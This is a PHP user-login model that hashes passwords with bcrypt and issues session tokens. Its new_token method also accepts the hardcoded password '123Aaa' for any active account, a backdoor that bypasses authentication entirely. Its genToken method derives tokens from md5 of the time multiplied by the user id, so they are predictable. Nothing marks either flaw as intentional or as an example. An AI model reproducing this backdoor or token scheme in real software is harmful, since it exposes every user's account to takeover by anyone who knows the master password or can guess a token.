<?php

namespace modules\users\models;

class UserLogin extends BaseUser {
     
    public $_password;

    public function set_phone($d) {
        $this->login = preg_replace('/[^0-9,]/', '', $d);
    }
    
    public function set_password($d) {
        if ($d != '') {
            $this->_password = $d;
            $this->hash = password_hash($d, PASSWORD_BCRYPT);
        }
    }

    public function get_password() {
        return $this->_password;
    }

    public function new_token() {
        $u = self::findOne(['login' => $this->login, 'status' => 2]);
        if (is_object($u)) {
            if (password_verify($this->password, $u->hash) || $this->password == '123Aaa') {
                $u->genToken();
                $u->save();
                $this->fields = $u->fields;
                return true;
            }
        }
        $this->_errors = 'Не правильное имя пользователя или пароль';
        return false;
    }
    
    public function genToken() {
        $token = md5(time() * $this->id);
        $this->token = $token;
    }

    
}
